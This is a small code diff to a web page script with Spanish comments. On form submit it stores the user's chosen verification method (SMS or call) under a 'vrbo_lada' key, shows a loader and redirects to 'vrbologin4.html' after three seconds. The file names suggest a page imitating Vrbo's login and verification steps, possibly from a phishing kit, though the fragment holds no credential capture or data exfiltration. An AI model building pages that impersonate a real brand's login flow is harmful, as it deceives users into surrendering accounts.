@@ -123,8 +123,8 @@ identityForm.addEventListener('submit', (e) => {
   e.preventDefault();
   btnContinuar.disabled = true;
   loader.classList.add('is-visible');
-  const lada = document.querySelector('.CRB__input:checked').value; // "SMS" o "CALL"
-  sessionStorage.setItem('vrbo_lada', lada); // ← opción = "lada"
+  const metodo = document.querySelector('.CRB__input:checked').value; // "SMS" o "CALL"
+  sessionStorage.setItem('vrbo_lada', metodo); // ← opción = "lada"
   setTimeout(() => { window.location.href = 'vrbologin4.html'; }, 3000);
 });
 </script>
